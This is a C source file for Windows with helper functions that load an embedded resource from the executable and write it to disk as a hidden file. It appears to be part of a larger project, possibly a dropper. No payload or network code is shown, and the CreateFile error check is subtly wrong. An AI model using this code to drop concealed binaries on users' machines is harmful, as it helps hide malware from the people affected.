#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnExtractResourceW(
	_In_ WORD    wResID,
	_In_ LPCWSTR lpResType,
	_In_ LPCWSTR lpFileName
) {
	DWORD dwBuffersize;
	LPVOID lpBuffer = fnLoadResourceW(wResID, lpResType, &dwBuffersize);
	if (lpBuffer && dwBuffersize) {
		if (fnSaveResourceW(lpFileName, lpBuffer, dwBuffersize)) {
			return TRUE;
		}
	}

	return FALSE;
}

LPVOID fnLoadResourceW(
	_In_  WORD    wResID,
	_In_  LPCWSTR lpResType,
	_Out_ LPDWORD dwBufferSize
) {
	*dwBufferSize = NULL;
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(wResID), lpResType);
	if (hResInfo) {
		HGLOBAL hResData = LoadResource(NULL, hResInfo);
		if (hResData) {
			LPVOID lpBuffer = LockResource(hResData);
			if (!lpBuffer) {
				fnMESSAGEHANDLERW(NULL, L"Couldn't lock Resource", L"LockResource", MB_ICONERROR);
				return NULL;
			}

			*dwBufferSize = SizeofResource(NULL, hResInfo);
			if (!*dwBufferSize) {
				fnMESSAGEHANDLERW(NULL, L"Couldn't get size of Resource", L"SizeOfResource", MB_ICONERROR);
				return NULL;
			}

			return lpBuffer;
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't load Resource", L"LoadResource", MB_ICONERROR);
		}
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't find Resource\nResourceID: %d\nResourceType: %s", L"FindResourceW", MB_ICONERROR, wResID, lpResType);
	}

	return NULL;
}

BOOL fnSaveResourceW(
	_In_ LPCWSTR lpFileName,
	_In_ LPVOID  lpBuffer,
	_In_ DWORD   dwBufferSize
) {
	HANDLE hFile = CreateFile(lpFileName, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile) {
		DWORD dwNOBW;
		if (WriteFile(hFile, lpBuffer, dwBufferSize, &dwNOBW, NULL)) {
			CloseHandle(hFile);
			return TRUE;
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't write Buffer to File", L"WriteFile", MB_ICONERROR);
			CloseHandle(hFile);
			return FALSE;
		}
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't create File\nFile: %s", L"CreateFileW", MB_ICONERROR, lpFileName);
		return FALSE;
	}
}